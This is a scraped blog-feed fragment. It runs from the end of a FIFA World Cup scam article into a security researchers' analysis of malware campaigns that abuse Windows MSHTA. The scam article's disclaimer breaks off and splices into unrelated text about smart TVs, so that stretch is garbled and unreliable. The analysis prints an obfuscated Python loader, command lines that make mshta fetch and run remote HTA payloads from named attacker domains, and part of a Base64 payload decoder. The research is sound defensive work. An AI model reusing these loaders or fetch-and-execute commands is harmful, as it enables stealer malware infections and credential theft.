624w\"\u003E\u003C\u002Ffigure\u003E\u003Cp\u003ESome messages promised winnings of up to $2 million and instructed victims to contact so-called “claims agents” or verification offices to process their reward.\u003C\u002Fp\u003E\u003Cp\u003EThe scams impersonated entities such as:\u003C\u002Fp\u003E\u003Cul\u003E\u003Cli\u003EFIFA Legal and Compliance Division\u003C\u002Fli\u003E\u003Cli\u003EFIFA World Cup 2026 Local Organizing Committee\u003C\u002Fli\u003E\u003Cli\u003EFIFA Awards promotional programs\u003C\u002Fli\u003E\u003C\u002Ful\u003E\u003Cp\u003ETo appear legitimate, the emails included reference numbers, Ticket IDs, Office addresses, legal terminology and even “confidential” PIN codes.\u003C\u002Fp\u003E\u003Cp\u003EOne version instructed recipients to contact a purported claims agent in South Africa using a free Gmail address, and to request personal information such as nationality, occupation, address, and phone number.\u003C\u002Fp\u003E\u003Cp\u003EAnother variation requested passport or national identification details early in the process, suggesting potential risks of identity theft in addition to financial fraud.\u003C\u002Fp\u003E\u003Cp\u003EThese campaigns follow the structure of classic advance-fee and lottery scams, but their use of FIFA branding and World Cup references makes them more believable to football fans who are expecting promotions, giveaways, ticket draws, and tournament-related offers.\u003C\u002Fp\u003E\u003Cp\u003EResearchers observed these scams operating alongside broader football-themed fraud, including fake merchandise stores, ticket scams, IPTV piracy services, counterfeit collectibles, and malvertising campaigns spread through social media.\u003C\u002Fp\u003E\u003Ch2 id=\"illegal-iptv-and-fake-football-apps\"\u003EIllegal IPTV and Fake Football Apps\u003C\u002Fh2\u003E\u003Cp\u003EThe investigation also uncovered football-themed piracy and fake app scam campaigns targeting fans seeking match streams and football content.\u003C\u002Fp\u003E\u003Cp\u003EIn Portugal, researchers linked UniTV and Xtream IPTV through shared entities and overlapping infrastructure, suggesting a single operator managing multiple IPTV brands simultaneously.\u003C\u002Fp\u003E\u003Cp\u003EThis type of setup allows operators to continue functioning even if one service is disrupted or removed.\u003C\u002Fp\u003E\u003Cp\u003EResearchers also identified coordinated fake football app scam campaigns connected to “Goal Rush” and “BEST APP,” which deployed dozens of fake entities across multiple operations.\u003C\u002Fp\u003E\u003Cp\u003ESome used Cyrillic character spoofing to evade moderation systems and automated detection tools, suggesting a more advanced and coordinated operation.\u003C\u002Fp\u003E\u003Ch2 id=\"how-to-stay-safe\"\u003EHow to Stay Safe\u003C\u002Fh2\u003E\u003Cp\u003EA few basic habits can significantly reduce the risk of falling victim to football\u002F FIFA World Cup &nbsp;scams:\u003C\u002Fp\u003E\u003Cul\u003E\u003Cli\u003EBe cautious with football-related ads and promotions appearing on social media, especially those offering unrealistic discounts, fake giveaways, or “limited-time” deals.\u003C\u002Fli\u003E\u003Cli\u003EAvoid clicking unsolicited links related to FIFA World Cup tickets, football merchandise, streaming platforms, or Panini collectibles.\u003C\u002Fli\u003E\u003Cli\u003EType official website addresses manually whenever possible instead of relying on links inside ads or emails.\u003C\u002Fli\u003E\u003Cli\u003ETreat countdown timers and aggressive urgency messages as warning signs rather than reasons to rush.\u003C\u002Fli\u003E\u003Cli\u003EUse scam detection tools such as \u003Ca href=\"https:\u002F\u002Fwww.bitdefender.com\u002Fen-us\u002Fconsumer\u002Fscamio\"\u003E\u003Cstrong\u003EBitdefender Scamio\u003C\u002Fstrong\u003E\u003C\u002Fa\u003E and \u003Ca href=\"https:\u002F\u002Fwww.bitdefender.com\u002Fen-us\u002Fconsumer\u002Flink-checker\"\u003E\u003Cstrong\u003EBitdefender Link Checker\u003C\u002Fstrong\u003E\u003C\u002Fa\u003E to analyze suspicious messages, screenshots, websites, and redirects before interacting with them.\u003C\u002Fli\u003E\u003Cli\u003EUse a security solution on your desktop and mobile devices to help block phishing pages, malicious redirects, fake storefronts, and scam websites distributed through social media ads and messaging apps.\u003C\u002Fli\u003E\u003C\u002Ful\u003E\u003Cp\u003EIf you believe you may have already interacted with a scam:\u003C\u002Fp\u003E\u003Cul\u003E\u003Cli\u003EContact your bank or card provider immediately if payment details were submitted\u003C\u002Fli\u003E\u003Cli\u003EMonitor your accounts closely for suspicious activity or follow-up phishing attempts\u003C\u002Fli\u003E\u003Cli\u003ETreat passport, ID, or personal information shared with suspicious websites as potentially compromised\u003C\u002Fli\u003E\u003Cli\u003EKeep screenshots, receipts, emails, and website addresses if purchased goods never arrive\u003C\u002Fli\u003E\u003Cli\u003EReport the scam to local fraud reporting or consumer protection authorities\u003C\u002Fli\u003E\u003C\u002Ful\u003E\u003Cp\u003EMost importantly, verify offers through official channels whenever possible. That means using FIFA.com for tournament information and tickets, recognized retailers for football merchandise and collectibles, and official streaming providers for live matches.\u003C\u002Fp\u003E\u003Cp\u003E\u003Cem\u003E\u003Cstrong\u003EDisclaimer: \u003C\u002Fstrong\u003EThis report is published for informational and educational purposes only. Portable, frequently updated and relatively inexpensive when compared to a new smart TV, these devices offer a convenient, cost-effective, and customizable way to access a vast selection of content from the comfort of your own home. Smart TVs and streaming devices account for a whopping 20% [pdf] of all connected IoT devices, and potential vulnerabilities in firmware could affect a significant user base.\n\nAs","\u002Fblog\u002Flabs\u002Fvulnerabilities-identified-amazon-fire-tv-stick-insignia-fire-os-tv-series\u002F","6a0b1dc6a89a0404d6eab60a","Microsoft’s MSHTA Legacy Tool Still Powers Malware Campaigns on Windows","microsofts-mshta-legacy-malware-windows","https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F05\u002Fmshta_flat_vector_3000w.png","2026-05-19T15:58:25.000+03:00","\u003Cp\u003E\u003Cem\u003EBitdefender security researchers have discovered that attackers continue to exploit Microsoft HTML Application Host (MSHTA), a legacy utility available by default on Windows systems that can execute VBScript and JavaScript from local or remote files.\u003C\u002Fem\u003E\u003C\u002Fp\u003E\u003Cp\u003ECybercriminals abuse legitimate, albeit legacy, tools to push a host of malware, ranging from run-of-the-mill password stealers to advanced threats. Bitdefender’s previous investigations already revealed how attackers used LOTL tactics in a Windows and macOS malware campaign that leveraged fake “Claude Code” Google ads.\u003C\u002Fp\u003E\u003Cp\u003E“ClickFix” attacks were also used with a new LummaStealer and CastleLoader campaign, not to mention the malware used to infect the devices of people who downloaded pirated versions of Leonardo DiCaprio’s new film, One Battle After Another.\u003C\u002Fp\u003E\u003Ch2 id=\"key-findings\"\u003EKey findings\u003C\u002Fh2\u003E\u003Cul\u003E\n\u003Cli\u003EMSHTA remains a widely abused Living-off-the-Land binary (LOLBIN) despite being a legacy utility.\u003C\u002Fli\u003E\n\u003Cli\u003EAttackers use it across multiple malware categories, from commodity stealers to advanced threats.\u003C\u002Fli\u003E\n\u003Cli\u003ECampaigns frequently rely on multi-stage, fileless execution chains involving PowerShell and HTA scripts.\u003C\u002Fli\u003E\n\u003Cli\u003ESocial engineering plays a critical role, including fake software downloads and ClickFix-style lures.\u003C\u002Fli\u003E\n\u003Cli\u003EEffective defense requires both user awareness and layered technical controls.\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Cp\u003EMicrosoft announced the deprecation of \u003Ca href=\"https:\u002F\u002Ftechcommunity.microsoft.com\u002Fblog\u002Fwindows-itpro-blog\u002Fvbscript-deprecation-timelines-and-next-steps\u002F4148301\" rel=\"noreferrer\"\u003EVBScript in the second half of 2024\u003C\u002Fa\u003E, making it available as a Feature On Demand, enabled by default. In 2027, this feature will be disabled by default, and Microsoft plans to remove it entirely from Windows.\u003C\u002Fp\u003E\u003Cp\u003EWe analyzed how attackers continue to abuse MSHTA, another legacy utility that remains available by default on Windows systems and can execute VBScript and JavaScript from local or remote files.\u003C\u002Fp\u003E\u003Cp\u003EIn recent months, we noticed an increase in detections of mshta.exe in the execution chain, indicating that it remains a relevant Living-off-the-Land binary even after standalone Internet Explorer was retired.\u003C\u002Fp\u003E\u003Cp\u003EThe activity we analyzed spans multiple malware categories.\u003C\u002Fp\u003E\u003Cp\u003EAt the lower end, MSHTA is heavily used in delivery chains for commodity stealers such as LummaStealer and Amatera, as well as loaders such as CountLoader and Emmenhtal Loader.\u003C\u002Fp\u003E\u003Cp\u003EAt the same time, it also shows up in more advanced and persistent malware campaigns, including ClipBanker and PurpleFox. This range of abuse highlights why MSHTA continues to matter to defenders: it’s not a single malware family or intrusion model. It remains useful across the spectrum from opportunistic malware delivery to long-lived compromise.\u003C\u002Fp\u003E\u003Cp\u003EDuring this investigation, we also identified recently introduced domain patterns for an HTA-based loader called CountLoader that delivers commodity malware.\u003C\u002Fp\u003E\u003Ch2 id=\"introduction\"\u003EIntroduction\u003C\u002Fh2\u003E\u003Cp\u003EAlthough Internet Explorer reached end of support on June 15, 2022, Microsoft Edge still includes an IE mode to ensure backward compatibility, with support promised at least until 2029 [2].\u003C\u002Fp\u003E\u003Cp\u003EThis reveals a broader security problem: even after companies retire legacy products, parts of their ecosystem can persist in Windows for years, supporting older workflows and enterprise compatibility requirements.\u003C\u002Fp\u003E\u003Cp\u003E&nbsp;Threat actors frequently abuse trusted, preinstalled Windows binaries to execute malicious content while relying on software already present on the system.\u003C\u002Fp\u003E\u003Cp\u003EThese binaries, commonly referred to as Living-off-the-Land binaries (LOLBINs), are valuable because they help attackers reduce the need to drop custom tools, blend into legitimate system activity, and make malicious chains harder to distinguish from benign administrative activity.\u003C\u002Fp\u003E\u003Cp\u003EMshta.exe is just one of these utilities, originally associated with Internet Explorer and capable of running HTML Applications (HTA) using the Internet Explorer rendering engine.\u003C\u002Fp\u003E\u003Cp\u003EHTA files can embed JavaScript and VBScript code, allowing script execution in the context of a trusted, signed process. Legacy components that many users consider obsolete can still serve as a convenient execution path for modern malware.\u003C\u002Fp\u003E\u003Cp\u003EThere is currently no public indication that this utility will also be removed from future versions of Windows. As long as it remains available by default, MSHTA remains relevant both as a residual administrative tool and as part of the exposed attack surface.\u003C\u002Fp\u003E\u003Ch2 id=\"legitimate-use\"\u003ELegitimate use\u003C\u002Fh2\u003E\u003Cp\u003EAlthough MSHTA is a legacy utility with more modern alternatives that offer similar capabilities, some system administrators and software developers still use it to alert users to updates or to display simple web applications without opening a browser.\u003C\u002Fp\u003E\u003Cp\u003EAround 10% of our MSHTA telemetry still consists of simple one-liner scripts that notify users about administrative tasks via javascript:alert() or vbscript:msgbox().\u003C\u002Fp\u003E\u003Cp\u003EAnother small portion of our MSHTA insights comes from seemingly legitimate login scripts executed through MSHTA one-liners that create a WScript.Shell object and run a local file in its context.\u003C\u002Fp\u003E\u003Cp\u003EThis remaining legitimate usage is important because it shows that MSHTA has not disappeared completely from real-world environments.\u003C\u002Fp\u003E\u003Cp\u003EAt the same time, these use cases are steadily becoming less common, and there are far more modern and legitimate ways to automate system administration tasks.\u003C\u002Fp\u003E\u003Cp\u003ETo accelerate this reduction in MSHTA use, we generally recommend moving away from MSHTA in administrative workflows wherever possible.\u003C\u002Fp\u003E\u003Ch3 id=\"mshta-as-a-lolbin\"\u003EMSHTA as a Lolbin\u003C\u002Fh3\u003E\u003Cp\u003ELOLBINs (Living-off-the-Land binaries) are attractive to attackers because they are signed, familiar, and often implicitly trusted within enterprise environments. When abused, they can help adversaries execute code, retrieve remote payloads, and progress an intrusion without immediately relying on obviously malicious binaries.\u003C\u002Fp\u003E\u003Cp\u003EMSHTA still fits this model well [10]. It is present by default on Windows systems, can execute script content in-memory, and can retrieve content from remote locations. These properties make it useful for stagers and loaders, allowing attackers to minimize on-disk artifacts and take advantage of a legitimate Microsoft-signed process during execution.\u003C\u002Fp\u003E\u003Cp\u003ESince the start of the year, we have observed an increase in MSHTA-related activity. Given that legitimate use of this utility is gradually fading, this trend likely reflects a rise in malicious activity rather than renewed administrative adoption.\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F05\u002F54ed49af-d50b-4124-9a16-6e5a4b40a7e4.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"1330\" height=\"122\" srcset=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw600\u002F2026\u002F05\u002F54ed49af-d50b-4124-9a16-6e5a4b40a7e4.png 600w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw1000\u002F2026\u002F05\u002F54ed49af-d50b-4124-9a16-6e5a4b40a7e4.png 1000w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F05\u002F54ed49af-d50b-4124-9a16-6e5a4b40a7e4.png 1330w\" sizes=\"(min-width: 720px) 720px\"\u003E\u003C\u002Ffigure\u003E\u003Cp\u003EIn the following sections, we’ll reveal the most prominent campaigns from our insights and show how threat actors continue to adapt MSHTA-based attacks to deliver commodity malware at scale.\u003C\u002Fp\u003E\u003Ch2 id=\"campaigns-employing-mshta\"\u003ECampaigns employing MSHTA\u003C\u002Fh2\u003E\u003Cp\u003EThe MSHTA activity we analyzed spans multiple types of malware, including commodity information stealers such as LummaStealer and Amatera, multi-stage loaders such as CountLoader and Emmenhtal Loader, banking malware such as ClipBanker, and more persistent threats such as PurpleFox.\u003C\u002Fp\u003E\u003Cp\u003EAcross these campaigns, MSHTA serves a similar purpose: it provides attackers with a built-in, Microsoft-signed utility that can retrieve and execute remote script content during the initial or intermediate stages of an infection chain.\u003C\u002Fp\u003E\u003Cp\u003EThis makes MSHTA especially useful for malware delivery. In some cases, it is used to launch HTA-based loaders directly from attacker-controlled infrastructure. In others, it is embedded into broader chains involving phishing, fake software installers, ClickFix-style lures or scripted downloaders.\u003C\u002Fp\u003E\u003Cp\u003EOur insights show that MSHTA most commonly appeared in campaigns that delivered stealers and loaders. This is significant because these malware families are often used to gain an initial foothold, steal credentials and browser-stored data, hijack sessions, and deliver additional payloads that can deepen the compromise.\u003C\u002Fp\u003E\u003Cp\u003EThis means that what may begin as the execution of a seemingly innocuous legacy Windows utility can quickly lead to account theft, financial fraud, data loss, or broader infection of the affected system.\u003C\u002Fp\u003E\u003Cp\u003EThis pattern is consistent with MSHTA’s role as a lightweight execution and staging mechanism. It is well-suited for retrieving obfuscated HTA content, launching in-memory scripts, and handing off execution to PowerShell, \u003Ca\u003EWScript\u003C\u002Fa\u003E, msiexec, or a final malware payload.\u003C\u002Fp\u003E\u003Ch2 id=\"lummastealer-and-amatera-via-countloader\"\u003ELummaStealer and Amatera via CountLoader\u003C\u002Fh2\u003E\u003Cp\u003EOne of the most prominent MSHTA-related clusters in our telemetry involved \u003Cem\u003ECountLoader\u003C\u002Fem\u003E, an HTA-based loader used to deliver commodity malware, most notably the information stealers \u003Cem\u003ELummaStealer \u003C\u002Fem\u003Eand \u003Cem\u003EAmatera\u003C\u002Fem\u003E.\u003C\u002Fp\u003E\u003Cp\u003EThese threats are relevant to users because their primary goal is to steal sensitive data, including credentials, browser-stored information, session tokens, and cryptocurrency-related data. In this delivery chain, MSHTA plays an important role as a lightweight execution mechanism that retrieves and launches the next-stage HTA payload from remote infrastructure.\u003C\u002Fp\u003E\u003Cp\u003EThe vast majority of detections for mshta.exe come from instances where the command line contains domains that appear to be legitimate services but are hosted on the .cc TLD (e.g., google-services[.]cc, memory-scanner[.]cc). \u003C\u002Fp\u003E\u003Cp\u003EThis campaign began to gain traction toward the end of 2025, peaked at the end of January 2026, and has since declined gradually as attackers shifted to other platforms to host the payloads.\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F05\u002Ff345a134-6d83-4d6b-89ce-4c6669013d47.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"901\" height=\"119\" srcset=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw600\u002F2026\u002F05\u002Ff345a134-6d83-4d6b-89ce-4c6669013d47.png 600w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F05\u002Ff345a134-6d83-4d6b-89ce-4c6669013d47.png 901w\" sizes=\"(min-width: 720px) 720px\"\u003E\u003C\u002Ffigure\u003E\u003Cp\u003EThese domains are often labeled as LummaStealer infrastructure on VirusTotal because Lumma is often the final payload delivered through this chain, and the same domains often appear in Lumma-related configurations.\u003C\u002Fp\u003E\u003Cp\u003EHowever, the loader appears to be distinct and can be correlated with existing reports of CountLoader [5], [6]. We also observed the same loader chain delivering Amatera, another commodity information stealer.\u003C\u002Fp\u003E\u003Cp\u003EThe lures used in this \u003Ca href=\"https:\u002F\u002Fwww.bitdefender.com\u002Fen-us\u002Fblog\u002Flabs\u002Flummastealer-second-life-castleloader\"\u003Ecampaign\u003C\u002Fa\u003E are similar to those employed by CastleLoader [7].\u003C\u002Fp\u003E\u003Cp\u003EVictims are enticed through messages, social media posts, or SEO-poisoned websites that promise free or cracked software. The downloaded archive may include the password directly in its filename or contain a document indicating the password to use.\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card kg-card-hascaption\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F05\u002Fbc56be63-7ca9-43bd-9f48-1361891ab51d.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"152\" height=\"212\"\u003E\u003Cfigcaption\u003E\u003Ci\u003E\u003Cb\u003E\u003Cstrong class=\"italic\" style=\"white-space: pre-wrap;\"\u003EArchive content with Python interpreter disguised as setup\u003C\u002Fstrong\u003E\u003C\u002Fb\u003E\u003C\u002Fi\u003E\u003C\u002Ffigcaption\u003E\u003C\u002Ffigure\u003E\u003Cp\u003EThe victim executes a Setup.exe file, which is in fact a legitimate Python interpreter. Alongside Setup.exe, the archive contains one or more \u003Cstrong\u003Epython3&lt;X&gt;.dll\u003C\u002Fstrong\u003E files that the interpreter automatically loads.\u003C\u002Fp\u003E\u003Cp\u003EThese are legitimate Python core DLLs, but during Python runtime initialization, they cause the local Lib directory to be used for dependency resolution and basic module loading. In the analyzed sample, the malicious Python script resided in \u003Cstrong\u003E.\\Lib\\encodings\\aliases.py\u003C\u002Fstrong\u003E and was launched through the corresponding \u003Cstrong\u003E__init__.py\u003C\u002Fstrong\u003E file.\u003C\u002Fp\u003E\u003Cp\u003EThe same directory also contains a renamed MSHTA executable, iso2022.exe. The malicious aliases.py script launches this binary to contact the C2 infrastructure and retrieve the HTA loader.\u003C\u002Fp\u003E\u003Cp\u003ETo construct the malicious URLs, the Python code defines individual characters as global variables and combines them through formatted strings before finally invoking os.system(cmd) to execute the resulting command line.\u003C\u002Fp\u003E\u003Cpre\u003E\u003Ccode class=\"language-bash\"\u003E### Regions\n\nglobal_region = f'{ctype}d Lib{typeB}encodings'\nlocal_format = f'{ptype}{typeE}org{typeA}wp{typeD}{atype}{typeA}{gtype}{typeA}stats{typeE}{ltype}'\nen_UK = f'{htype}{ttype}{ttype}p{stype}{typeC}{typeB}{typeB}'\nen_US = f'{typeE}{ctype}{ctype}'\nen_ES = f'iso2022{typeE}e{xtype}e'\n\n### Protection\nmem_protect = f'{global_region} {typeH}{typeH} {en_ES} {en_UK}{local_format}'\nram_protect = f'alpha{typeD}centavr{typeE}{ctype}{ctype}'\nrem_protect = f'{ctype}{mtype}d {typeA}{ctype} {stype}{ttype}ar{ttype} {typeA}b \\\"\\\" {ctype}{mtype}d {typeA}{ctype} '\n\n### Probes\npositive_probe = f'{mem_protect} {typeH} {en_ES} {en_UK}{ram_protect}'\nnegative_probe = f'{rem_protect}'\n\ncmd = f'{positive_probe}'\nos.system(cmd)\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EThe resulting command line is:\u003C\u002Fp\u003E\u003Cpre\u003E\u003Ccode class=\"language-bash\"\u003Ecd Lib\\encodings &amp;&amp; iso2022.exe https:\\\\planetitude[.]org\u002Fwp-admin\u002Fchellenge\u002Fstats.location &amp; iso2022[.]exe https:\\\\alpha-centavr[.]cc\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EThe HTA decodes the next payload from an array of character codes and launches it. The variable names seem to be generated from a dictionary of technical terms, and they vary from file to file.\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card kg-card-hascaption\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F05\u002Fimage-2.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"936\" height=\"248\" srcset=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw600\u002F2026\u002F05\u002Fimage-2.png 600w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F05\u002Fimage-2.png 936w\" sizes=\"(min-width: 720px) 720px\"\u003E\u003Cfigcaption\u003E\u003Ci\u003E\u003Cb\u003E\u003Cstrong class=\"italic\" style=\"white-space: pre-wrap;\"\u003ECountLoader payload decode function\u003C\u002Fstrong\u003E\u003C\u002Fb\u003E\u003C\u002Fi\u003E\u003C\u002Ffigcaption\u003E\u003C\u002Ffigure\u003E\u003Cfigure class=\"kg-card kg-image-card kg-card-hascaption\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F05\u002Fimage-3.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"656\" height=\"1296\" srcset=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw600\u002F2026\u002F05\u002Fimage-3.png 600w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F05\u002Fimage-3.png 656w\"\u003E\u003Cfigcaption\u003E\u003Ci\u003E\u003Cb\u003E\u003Cstrong class=\"italic\" style=\"white-space: pre-wrap;\"\u003ECountLoader killchain\u003C\u002Fstrong\u003E\u003C\u002Fb\u003E\u003C\u002Fi\u003E\u003C\u002Ffigcaption\u003E\u003C\u002Ffigure\u003E\u003Cp\u003EStarting in late February 2026, we observed a new \u003Cem\u003ECountLoader \u003C\u002Fem\u003Edomain-hosting pattern. The naming convention remained similar, using domains that imitate legitimate service names, but the infrastructure shifted to .vg and .gl TLDs.\u003C\u002Fp\u003E\u003Cp\u003EExamples include \u003Cstrong\u003Eexplorer[.]vg, ccleaner[.]gl\u003C\u002Fstrong\u003E, and \u003Cstrong\u003Emicroservice[.]gl\u003C\u002Fstrong\u003E. The HTA scripts embedded at these locations follow the same obfuscation pattern observed in the earlier .cc-based infrastructure.\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card kg-card-hascaption\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F05\u002Fimage-4.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"570\" height=\"260\"\u003E\u003Cfigcaption\u003E\u003Ci\u003E\u003Cb\u003E\u003Cstrong class=\"italic\" style=\"white-space: pre-wrap;\"\u003EMSHTA with .vg or .gl domains\u003C\u002Fstrong\u003E\u003C\u002Fb\u003E\u003C\u002Fi\u003E\u003C\u002Ffigcaption\u003E\u003C\u002Ffigure\u003E\u003Ch2 id=\"emmenhtal-loader\"\u003EEmmenhtal Loader\u003C\u002Fh2\u003E\u003Cp\u003EAnother prominent MSHTA-based infection chain we observed involved \u003Cem\u003EEmmenhtal Loader\u003C\u002Fem\u003E [3], a multi-stage loader used to deliver commodity malware, including information stealers such as \u003Cem\u003ELummaStealer\u003C\u002Fem\u003E. In this campaign, MSHTA serves as an early-stage execution mechanism that retrieves and launches a remote HTA payload, which then unfolds through multiple script-based stages.\u003C\u002Fp\u003E\u003Cp\u003EThe infection chain begins with phishing messages on Discord that contain links to pages designed to hijack the clipboard and trick the user into executing a malicious command line as part of a fake human-verification process.\u003C\u002Fp\u003E\u003Cp\u003EThese pages resemble legitimate reCAPTCHA systems, but are hosted on suspicious websites (e.g. \u003Cstrong\u003Ehumancheck[.]shop\u002Fpass-this-step-to-continue[.]html\u003C\u002Fstrong\u003E) and include JavaScript code that copies a malicious command line to the clipboard when the user accesses the page.\u003C\u002Fp\u003E\u003Cp\u003EThe user is then lured into pressing Win + R to open the Run dialog, followed by Ctrl + V and Enter to paste and execute the command. As a result, explorer.exe appears to legitimately launch mshta.exe with a command line such as:\u003C\u002Fp\u003E\u003Cpre\u003E\u003Ccode class=\"language-bash\"\u003Emshta[.]exe hxxps[:\u002F\u002F]buck2nd[.]oss-eu-central-1[.]aliyuncs[.]com\u002Fdir\u002Fsixth\u002Fsingl6[.]mp4 # &nbsp;✅ ''I am not a robot - reCAPTCHA Verification ID: 2165\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003EAlthough these websites are often taken down quickly by their hosting providers, some server responses remain available on VirusTotal and can still be analyzed.\u003C\u002Fp\u003E\u003Cp\u003EThe file hosted on the server is a valid HTA, but it is intentionally bloated with large amounts of garbage data that are ignored during execution. Embedded within this content are a few valid HTML blocks that contain the malicious script. The file is never written to disk; instead, it is executed directly in memory by mshta.exe.\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F05\u002Fimage-5.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"936\" height=\"234\" srcset=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw600\u002F2026\u002F05\u002Fimage-5.png 600w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F05\u002Fimage-5.png 936w\" sizes=\"(min-width: 720px) 720px\"\u003E\u003C\u002Ffigure\u003E\u003Cp\u003EThe HTML structure is spread across the file, inserted between unusable data that is ignored. First, it sets the MSHTA window to 1x1 pixels, starts it minimized, and hides it from the taskbar to evade detection.\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F05\u002Fimage-6.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"936\" height=\"528\" srcset=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw600\u002F2026\u002F05\u002Fimage-6.png 600w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F05\u002Fimage-6.png 936w\" sizes=\"(min-width: 720px) 720px\"\u003E\u003C\u002Ffigure\u003E\u003Cp\u003ENext, the HTML body invokes the script entry point:\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F05\u002Fimage-7.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"2000\" height=\"379\" srcset=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw600\u002F2026\u002F05\u002Fimage-7.png 600w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw1000\u002F2026\u002F05\u002Fimage-7.png 1000w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw1600\u002F2026\u002F05\u002Fimage-7.png 1600w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw2400\u002F2026\u002F05\u002Fimage-7.png 2400w\" sizes=\"(min-width: 720px) 720px\"\u003E\u003C\u002Ffigure\u003E\u003Cp\u003EThe script block contains a minimal JavaScript loader that implements a Base64 decoding function and includes a large Base64-encoded string as a variable. The main function decodes and executes the embedded script.\u003C\u002Fp\u003E\u003Cpre\u003E\u003Ccode class=\"language-bash\"\u003E&lt;script&gt;\nfunction HbQIdLwSSIRvbVXZWLOwjRQqttuGTqKP(b64) {\n    var VonICsfLpEqDZndPtRRVmRdurFjpCMUv=\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+\u002F\";\n    var pad=0;\n    if(b64.length&gt;=2 &amp;&amp; b64.substr(b64.length-2)===\"==\"){pad=2;b64=b64.substr(0,b64.length-2);}\n    else if(b64.length&gt;=1 &amp;&amp; b64.substr(b64.length-1)===\"=\"){pad=1;b64=b64.substr(0,b64.length-1);}\n    var out=[];\n    var i=0;\n    while(i&lt;b64.length){\n        var e1=VonICsfLpEqDZndPtRRVmRdurFjpCMUv.indexOf(b64.charAt(i++));\n        var e2=VonICsfLpEqDZndPtRRVmRdurFjpCMUv.indexOf(b64.charAt(i++));\n        var e3=VonICsfLpEqDZndPtRRVmRdurFjpCMUv.indexOf(b64.charAt(i++));\n        var e4=VonICsfLpEqDZndPtRRVmRdurFjpCMUv.indexOf(b64.charAt(i++));\n\n        var c1=(e1&lt;&lt;2)|(e2&gt;&gt;4);\n        var c2=((e2&amp;15)&lt;&lt;4)|(e3&gt;&gt;2);\n        var c3=((e3&amp;3)&lt;&lt;6)|e4;\n        out.push(c1&amp;0xFF);\n        if(e3!==64&amp;&amp;e3!==-1) out.push(c2&amp;0xFF);\n 